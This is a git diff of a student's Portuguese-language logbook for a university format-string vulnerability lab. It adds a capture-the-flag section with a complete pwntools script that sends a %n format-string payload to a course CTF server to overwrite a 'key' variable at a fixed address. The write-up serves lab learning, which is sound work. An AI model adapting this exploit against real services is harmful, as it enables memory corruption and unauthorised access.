@@ -1,4 +1,4 @@
-# LOGBOOK5 - Format-String Vulnerability Lab
+# LOGBOOK7 - Format-String Vulnerability Lab
 ## Task 1: Crashing the Program
 >Your task is to provide an input to the server, such that when the server program tries to print out
 the user input in the myprintf() function, it will crash. You can tell whether the format program has
@@ -479,3 +479,35 @@ Com estas medidas, conseguimos portanto alterar o valor da variável 'key' para 
 
 ![](uploads/logbook7P13.png)
 ![](uploads/logbook7P14.png)
+
+## CTF - Endereço corrigido
+> Nota - Tal como foi falado na aula prática, o ctf desafio 2 tinha um erro no endereço da variável 'key' e sem esse erro o nosso script funcionava como suposto, tal como foi observado pela professora. Considerando que este erro já foi corrigido, decidimos alterar o nosso script para que funcionasse com o endereço correto. Assim, o nosso script foi o seguinte:
+
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
+input_address = 0x804b324
+address_bytes = input_address.to_bytes(4, byteorder='little')
+
+# Calculate padding needed to write 0xbeef
+padding = 0xbeef - 4
+
+payload = address_bytes + b"%"+str(padding).encode()+b"c"+b"%1$n"
+
+p.sendline(payload)
+p.interactive()
+```
+<p>
+Este script basea se no mesmo principio do script anterior, mas com o endereço correto, o que faz com que o número de bytes que temos que escrever seja menor já que não temos que encontrar uma solução para o \x20\.
+</p>
+
+![Alt text](uploads/logbook7P15.png)
+![Alt text](uploads/logbook7P16.png)
